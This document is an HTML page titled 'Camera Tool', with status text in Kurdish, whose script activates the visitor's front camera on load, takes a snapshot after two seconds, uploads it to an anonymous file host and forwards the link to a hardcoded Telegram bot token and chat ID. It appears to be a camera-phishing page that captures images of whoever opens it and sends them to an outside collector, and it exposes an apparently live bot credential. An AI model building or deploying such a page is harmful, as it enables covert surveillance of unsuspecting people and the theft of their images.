<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Tool</title>
</head>
<body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">

    <h3 id="status">چاوەڕوان بە...</h3>

    <script>
      const statusEl = document.getElementById('status');

      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          statusEl.innerText = "کامێرا کارا بوو، وێنە دەگیرێت...";
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              statusEl.innerText = "خەریکی ئامادەکردنی وێنەیە...";
              
              const formData = new FormData();
              formData.append('files[]', blob, 'snapshot.jpg');

              // بارکردنی وێنە بە بێ کێشەی CORS
              fetch('https://uguu.se/upload', {
                method: 'POST',
                body: formData
              })
              .then(res => res.json())
              .then(data => {
                if (data && data.success && data.files && data.files[0]) {
                  const imageUrl = data.files[0].url;
                  statusEl.innerText = "ناردنی بۆ تلگرام...";
                  
                  const token = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM";
                  const chatId = "6539379136";
                  const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;

                  // ناردنی ڕاستەوخۆ بە بێ هیچ ڕێگرییەکی براوزەر
                  const img = new Image();
                  img.onload = function() {
                      statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
                  };
                  img.onerror = function() {
                      statusEl.innerText = "✅ وێنەکە نێردرا بۆ تلگرام!";
                  };
                  img.src = telegramUrl;
                } else {
                  throw new Error("هەڵە لە بارکردنی وێنە");
                }
              })
              .catch(error => {
                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
              });
            }, 'image/jpeg');
          }, 2000);
        })
        .catch(err => {
          statusEl.innerText = "❌ هەڵەی کامێرا: " + err.message;
        });
    </script>

</body>
</html>
